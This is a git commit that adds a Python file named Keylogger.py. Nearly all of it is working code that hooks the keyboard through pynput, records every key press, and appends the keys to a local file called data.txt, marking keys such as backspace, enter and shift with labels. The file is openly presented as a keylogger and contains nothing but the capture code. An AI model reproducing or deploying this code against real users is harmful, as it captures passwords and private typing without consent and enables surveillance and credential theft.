0bd0955d1584603a9885ac408c0bd51922d34ade
J4r0d-x55 <108584837+J4r0d-x55@users.noreply.github.com>
2022-09-14 13:55:37 +0200

    Add files via upload

---
+++ Keylogger.py
@@ -0,0 +1,38 @@
+import os
+from pynput.keyboard import Listener
+
+path = "data.txt"
+keys = []
+count = 0
+
+
+def on_press(key):
+    global keys, count
+
+    keys.append(key)
+    count += 1
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys = []
+
+def write_file(keys):
+    with open(path, 'a') as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find('backspace') > 0:
+                f.write(' Backspace ')
+            elif k.find('enter') > 0:
+                f.write('\n')
+            elif k.find('shift') > 0:
+                f.write(' Shift ')
+            elif k.find('space') > 0:
+                f.write(' ')
+            elif k.find('caps_lock') > 0:
+                f.write(' caps_lock ')
+            elif k.find('Key'):
+                f.write(k)
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
